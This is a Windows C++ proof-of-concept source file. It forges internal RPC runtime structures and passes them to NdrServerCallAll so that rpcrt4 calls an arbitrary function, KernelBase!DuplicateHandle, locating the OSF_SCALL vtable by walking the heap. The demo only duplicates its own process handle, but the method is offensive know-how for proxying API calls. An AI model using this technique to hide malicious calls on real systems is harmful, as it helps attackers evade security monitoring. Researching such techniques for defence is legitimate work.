#include <iostream>
#include <Windows.h>
#include <ndr64types.h>
#pragma comment(lib, "rpcrt4.lib")

#define MAGIC_ID 0x89abcdef
#define OSF_SCALL_TYPE 0x00000040

#ifdef _WIN64

typedef int HANDLE_TYPE;
typedef HANDLE RPC_TRANSPORT_CONNECTION;
typedef HANDLE RPC_TRANSPORT_ADDRESS;
typedef RPC_TRANSPORT_CONNECTION(RPC_ENTRY* _I_RpcTransServerNewConnection)(RPC_TRANSPORT_ADDRESS);

typedef struct _MESSAGE_OBJECT
{
    PVOID Vtable;
    DWORD Magic;
    HANDLE_TYPE Type;
    BYTE Padding[326];
    PVOID UnkMustBeNull;
} MESSAGE_OBJECT, * PMESSAGE_OBJECT;

typedef struct _NDR64_CALL_STRUCT
{
    struct _NDR64_PROC_FORMAT frag1;
    struct _NDR64_PARAM_FORMAT frag2;
    struct _NDR64_PARAM_FORMAT frag3;
    struct _NDR64_PARAM_FORMAT frag4;
    struct _NDR64_PARAM_FORMAT frag5;
    struct _NDR64_PARAM_FORMAT frag6;
    struct _NDR64_PARAM_FORMAT frag7;
    struct _NDR64_PARAM_FORMAT frag8;
} NDR64_CALL_STRUCT;

typedef struct _DUPLICATEHANDLE_RPC_BUFFER
{
    HANDLE SourceProcessHandle;
    HANDLE SourceHandle;
    HANDLE TargetProcessHandle;
    LPHANDLE TargetHandle;
    DWORD DesiredAccess;
    BOOL InheritHandle;
    DWORD Options;
} DUPLICATEHANDLE_RPC_BUFFER, * PDUPLICATEHANDLE_RPC_BUFFER;

ULONG_PTR GetOsfVtableAddress();
ULONG_PTR GetDuplicateHandleProcAddress();

int wmain(int argc, wchar_t* argv[])
{
    ULONG_PTR osfvft, duphandle;
    MESSAGE_OBJECT MessageObject;
    SERVER_ROUTINE ServerRoutineTable[1];
    RPC_MESSAGE RpcMessage;
    RPC_SERVER_INTERFACE RpcServerInterface;
    MIDL_SERVER_INFO MidlServerInfo;
    MIDL_STUB_DESC MidlStubDesc;
    MIDL_SYNTAX_INFO MidlSyntaxInfoTable[2];
    NDR64_CALL_STRUCT NdrCallStruct;
    NDR64_FORMAT_CHAR NdrLongLong = 0x07;
    NDR64_FORMAT_CHAR NdrLong = 0x05;
    FormatInfoRef FormatInfoRefTable[1];
    DUPLICATEHANDLE_RPC_BUFFER RpcBuffer = { 0 };
    HANDLE hTargetHandle = NULL;

    // Memory allocations made by the RPC runtime are done using the heap handle stored
    // in the global variable 'hRpcHeap', which is normally initialized with the handle
    // of the default process heap. Calling 'RpcStringFree' is an easy way to trigger
    // this initialization.
#pragma warning(disable : 6387)
    RpcStringFreeW(NULL);

    if (!(osfvft = GetOsfVtableAddress()))
    {
        wprintf(L"[-] Failed to determine the address of OSF_SCALL::`vtable'.\n");
        goto end;
    }
        
    wprintf(L"[+] OSF_SCALL::`vtable' @ 0x%llx\n", osfvft);

    if (!(duphandle = GetDuplicateHandleProcAddress()))
    {
        wprintf(L"[-] Failed to determine the address of KernelBase!DuplicateHandle.\n");
        goto end;
    }

    wprintf(L"[+] KernelBase!DuplicateHandle @ 0x%llx\n", duphandle);

    //
    // The following IDL was used to generate the NDR call structure with the
    // MIDL compiler. Note that we only need to care about the size of the 
    // arguments. For instance, 'lpTargetHandle' is a pointer, so we can treat
    // it as a 'long long' in 64-bit, or 'long' in 32-bit.
    //
    // [
    //     uuid(c497da01-9810-46d8-8c49-43d1080591db),
    //     version(1.0),
    // ]
    // interface duplicatehandle
    // {
    //     void SrvDuplicateHandle(
    //         [in] long long hSourceProcessHandle,
    //         [in] long long hSourceHandle,
    //         [in] long long hTargetProcessHandle,
    //         [in] long long lpTargetHandle,
    //         [in] long dwDesiredAccess,
    //         [in] long bInheritHandle,
    //         [in] long dwOptions
    //     );
    // }
    //
    NdrCallStruct =
    {
        {
                (NDR64_UINT32)66,
                (NDR64_UINT32)56, // Stack size
                (NDR64_UINT32)112,
                (NDR64_UINT32)0,
                (NDR64_UINT16)0,
                (NDR64_UINT16)0,
                (NDR64_UINT16)7, // Number of arguments
                (NDR64_UINT16)0
        },
        // hSourceProcessHandle, stack offset 0
        { &NdrLongLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 0, },
        // hSourceHandle, stack offset 8
        { &NdrLongLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 8, },
        // hTargetProcessHandle, stack offset 16
        { &NdrLongLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 16, },
        // lpTargetHandle, stack offset 24
        { &NdrLongLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 24, },
        // dwDesiredAccess, stack offset 32
        { &NdrLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 32, },
        // bInheritHandle, stack offset 40
        { &NdrLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 40, },
        // dwOptions, stack offset 48
        { &NdrLong, { 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, (NDR64_UINT16)0, 0 }, (NDR64_UINT16)0, 48, }
    };

    ServerRoutineTable[0] = (SERVER_ROUTINE)duphandle;
    FormatInfoRefTable[0] = &NdrCallStruct;

    RtlFillMemory(MidlSyntaxInfoTable, sizeof(MidlSyntaxInfoTable), 0x46);
    MidlSyntaxInfoTable[1].FmtStringOffset = (unsigned short*)FormatInfoRefTable;

    RtlFillMemory(&MidlStubDesc, sizeof(MidlStubDesc), 0x45);
    MidlStubDesc.RpcInterfaceInformation = &RpcServerInterface;
    MidlStubDesc.Version = 0x60001;
    MidlStubDesc.pMallocFreeStruct = NULL;

    RtlFillMemory(&MidlServerInfo, sizeof(MidlServerInfo), 0x44);
    MidlServerInfo.pStubDesc = &MidlStubDesc;
    MidlServerInfo.DispatchTable = ServerRoutineTable;
    MidlServerInfo.ThunkTable = NULL;
    MidlServerInfo.pSyntaxInfo = MidlSyntaxInfoTable;

    RtlFillMemory(&RpcServerInterface, sizeof(RpcServerInterface), 0x43);
    RpcServerInterface.Length = sizeof(RpcServerInterface);
    RpcServerInterface.InterpreterInfo = &MidlServerInfo;

    RtlFillMemory(&MessageObject, sizeof(MessageObject), 0x42);
    MessageObject.Vtable = (PVOID)osfvft;
    MessageObject.Magic = MAGIC_ID;
    MessageObject.Type = OSF_SCALL_TYPE;
    MessageObject.UnkMustBeNull = NULL;

    RtlFillMemory(&RpcMessage, sizeof(RpcMessage), 0x41);
    RpcMessage.Handle = &MessageObject;
    RpcMessage.Buffer = &RpcBuffer;
    RpcMessage.BufferLength = sizeof(RpcBuffer);
    RpcMessage.ProcNum = 0;
    RpcMessage.RpcInterfaceInformation = &RpcServerInterface;
    RpcMessage.ManagerEpv = NULL;
    RpcMessage.RpcFlags = 0x1000;

    RpcBuffer.SourceProcessHandle = GetCurrentProcess();
    RpcBuffer.SourceHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, GetCurrentProcessId());
    RpcBuffer.TargetProcessHandle = GetCurrentProcess();
    RpcBuffer.TargetHandle = &hTargetHandle;
    RpcBuffer.DesiredAccess = PROCESS_ALL_ACCESS;
    RpcBuffer.InheritHandle = FALSE;
    RpcBuffer.Options = 0;

    wprintf(L"[+] Handle to duplicate: 0x%08x\n", HandleToULong(RpcBuffer.SourceHandle));

    __try
    {
        NdrServerCallAll(&RpcMessage);

        if (hTargetHandle)
        {
            wprintf(L"[+] Success! Duplicated handle: 0x%08x\n", HandleToULong(hTargetHandle));
        }
        else
        {
            wprintf(L"[-] Failure.\n");
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        wprintf(L"[-] Exception: 0x%08x\n", GetExceptionCode());
    }

end:
    if (RpcBuffer.SourceHandle) CloseHandle(RpcBuffer.SourceHandle);
    if (hTargetHandle) CloseHandle(hTargetHandle);
}

ULONG_PTR GetOsfVtableAddress()
{
    ULONG_PTR osfvft = 0;
    HMODULE rpcrt4;
    _I_RpcTransServerNewConnection I_RpcTransServerNewConnection;
    RPC_TRANSPORT_CONNECTION hConnection;
    PVOID pDummyBuffer1 = NULL, pDummyBuffer2 = NULL;
    HANDLE hProcessHeap;
    DWORD i;
    const DWORD dwDummyBufferSize = 4096;
    PROCESS_HEAP_ENTRY phe;

    hProcessHeap = GetProcessHeap();

    if (!(rpcrt4 = LoadLibraryW(L"rpcrt4.dll"))) goto end;
    if (!(I_RpcTransServerNewConnection = (_I_RpcTransServerNewConnection)GetProcAddress(rpcrt4, "I_RpcTransServerNewConnection"))) goto end;

    __try
    {
        // I_RpcTransServerNewConnection decrements the handle (which is in fact a memory
        // address) we provide by 0x20 (32) bytes. Then, it adds 0x40 (64) to the derefenced
        // value, and derefences the resulting pointer to determine the memory size to
        // allocate for the OSF_SCONNECTION object.
        // 
        //     AllocWrapper((ulonglong)*(uint *)(*(longlong *)(param_1 + -0x20) + 0x40) + 0x208)
        // 
        // By doing the following, we make sure these operations are valid, without worrying
        // too much about the offsets.
        if (!(pDummyBuffer1 = HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, dwDummyBufferSize))) goto end;
        if (!(pDummyBuffer2 = HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, dwDummyBufferSize))) goto end;
        *(PULONG_PTR)((ULONG_PTR)pDummyBuffer1 + dwDummyBufferSize / 2 - 0x20) = (ULONG_PTR)pDummyBuffer2;
        if (!(hConnection = I_RpcTransServerNewConnection((RPC_TRANSPORT_ADDRESS)((ULONG_PTR)pDummyBuffer1 + dwDummyBufferSize / 2)))) goto end;

        // If I_RpcTransServerNewConnection returns successfully, it means that it allocated
        // an OSF_SCONNECTION object and an OSF_SCALL object on the heap. We are interested
        // in the second one only. Its layout would be as follows.
        //
        //     XX XX XX XX  XX XX XX XX <- OSF_SCALL::`vtable' adddress
        //     ef cd ab 89  40 00 00 00 <- MAGIC ID + object type (OSF_SCALL_TYPE)
        //
        // By searching for the magic value and the object type, we will find the OSF_SCALL
        // object. We can then substract the size of a pointer from the address at which we
        // found the two DWORD values, and dereference the pointer to get the address of the
        // object's vtable (OSF_SCALL::`vtable').
        ZeroMemory(&phe, sizeof(phe));
        if (!HeapWalk(hProcessHeap, &phe)) goto end;
        for (i = 0; i < phe.Region.dwCommittedSize / sizeof(DWORD); i++)
        {
            if (((PDWORD)hProcessHeap)[i] == MAGIC_ID && ((PDWORD)hProcessHeap)[i + 1] == OSF_SCALL_TYPE)
            {
                osfvft = *(PULONG_PTR)((ULONG_PTR) & ((PDWORD)hProcessHeap)[i] - 0x08);
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        wprintf(L"[-] Exception: 0x%08x\n", GetExceptionCode());
    }

end:
    if (pDummyBuffer1) HeapFree(hProcessHeap, 0, pDummyBuffer1);
    if (pDummyBuffer2) HeapFree(hProcessHeap, 0, pDummyBuffer2);
    return osfvft;
}

ULONG_PTR GetDuplicateHandleProcAddress()
{
    ULONG_PTR proc = 0;
    HMODULE kernelbase;

    if (kernelbase = GetModuleHandleW(L"KernelBase.dll"))
        proc = (ULONG_PTR)GetProcAddress(kernelbase, "DuplicateHandle");

    return proc;
}

#else
#error This code is compatible with x86_64 arch only.
#endif // _WIN64